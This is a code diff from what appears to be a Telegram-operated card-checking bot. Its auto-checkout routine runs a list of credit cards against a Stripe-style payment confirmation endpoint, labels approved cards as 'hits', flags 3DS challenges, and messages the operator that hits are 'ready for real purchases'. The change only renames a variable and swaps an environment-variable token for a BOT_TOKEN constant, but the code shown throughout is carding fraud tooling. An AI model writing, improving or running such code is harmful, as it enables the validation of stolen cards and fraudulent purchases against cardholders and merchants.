@@ -1229,11 +1229,11 @@ async function testCardWithStripe(cardData, stripeData, attemptNumber) {
           };
 
           const confirmReq = https.request(confirmOptions, (confirmRes) => {
-            let confirmData = '';
-            confirmRes.on('data', (chunk) => confirmData += chunk);
+            let responseData = '';
+            confirmRes.on('data', (chunk) => responseData += chunk);
             confirmRes.on('end', () => {
               try {
-                const response = JSON.parse(confirmData);
+                const response = JSON.parse(responseData);
                 const processingTime = Date.now() - startTime;
 
                 let result = {
@@ -1249,14 +1249,14 @@ async function testCardWithStripe(cardData, stripeData, attemptNumber) {
                 };
 
                 // Check for success
-                if (response.status === 'succeeded' || confirmData.includes('"status": "succeeded"')) {
+                if (response.status === 'succeeded' || responseData.includes('"status": "succeeded"')) {
                   result.approved = true;
                   result.response = 'approved';
                 }
                 // Check for 3DS requirements
-                else if (confirmData.includes('requires_source_action') ||
-                         confirmData.includes('intent_confirmation_challenge') ||
-                         confirmData.includes('requires_action')) {
+                else if (responseData.includes('requires_source_action') ||
+                         responseData.includes('intent_confirmation_challenge') ||
+                         responseData.includes('requires_action')) {
                   result.needsAuth = true;
                   result.response = 'requires_auth';
                 }
@@ -1376,7 +1376,7 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
       `📢 <b>Hits sent instantly!</b>\n\n` +
       `═══════════════════════`;
 
-    await sendMessage(process.env.TELEGRAM_BOT_TOKEN, chatId, startMessage);
+    await sendMessage(BOT_TOKEN, chatId, startMessage);
 
     let processed = 0;
     let hits = [];
@@ -1417,7 +1417,7 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
             `⏰ <b>Last update:</b> ${new Date().toLocaleTimeString()}\n\n` +
             `═══════════════════════`;
 
-          await sendMessage(process.env.TELEGRAM_BOT_TOKEN, chatId, progressMessage);
+          await sendMessage(BOT_TOKEN, chatId, progressMessage);
         }
 
         // Test card with advanced Stripe-like logic
@@ -1460,7 +1460,7 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
             `🚀 <b>Ready for real purchases!</b>\n\n` +
             `═══════════════════════`;
 
-          await sendMessage(process.env.TELEGRAM_BOT_TOKEN, chatId, hitMessage);
+          await sendMessage(BOT_TOKEN, chatId, hitMessage);
           console.log(`[AUTO-CHECKOUT] HIT! Card ${testResult.bin}****${testResult.lastFour} approved for user ${userId}`);
 
           // Update user's hit count in database
@@ -1482,7 +1482,7 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
             `✅ <b>Potential:</b> May work for manual purchases\n\n` +
             `═══════════════════════`;
 
-          await sendMessage(process.env.TELEGRAM_BOT_TOKEN, chatId, authMessage);
+          await sendMessage(BOT_TOKEN, chatId, authMessage);
           console.log(`[AUTO-CHECKOUT] 3DS Required for card ${testResult.bin}****${testResult.lastFour}`);
 
         } else if (testResult.declined) {
@@ -1510,7 +1510,7 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
               `⏭️ <b>Testing next card...</b>\n\n` +
               `═══════════════════════`;
 
-            await sendMessage(process.env.TELEGRAM_BOT_TOKEN, chatId, declineMessage);
+            await sendMessage(BOT_TOKEN, chatId, declineMessage);
           }
         }
 
@@ -1525,7 +1525,7 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
           `⏭️ <b>Continuing with next card...</b>\n\n` +
           `═══════════════════════`;
 
-        await sendMessage(process.env.TELEGRAM_BOT_TOKEN, chatId, errorMessage);
+        await sendMessage(BOT_TOKEN, chatId, errorMessage);
         continue;
       }
     }
@@ -1550,7 +1550,7 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
       `💡 <b>Tip:</b> Approved cards are ready for manual purchase\n\n` +
       `═══════════════════════`;
 
-    await sendMessage(process.env.TELEGRAM_BOT_TOKEN, chatId, completionMessage);
+    await sendMessage(BOT_TOKEN, chatId, completionMessage);
     console.log(`[AUTO-CHECKOUT] Session completed for user ${userId}: ${hits.length} hits, ${declined} declines, ${authRequired} 3DS from ${processed} cards`);
 
   } catch (error) {
@@ -1563,7 +1563,7 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
         `💡 <b>Please try again or contact admin</b>\n\n` +
         `═══════════════════════`;
 
-      await sendMessage(process.env.TELEGRAM_BOT_TOKEN, chatId, errorMessage);
+      await sendMessage(BOT_TOKEN, chatId, errorMessage);
     } catch (msgError) {
       console.error('[AUTO-CHECKOUT] Could not send error message:', msgError);
     }
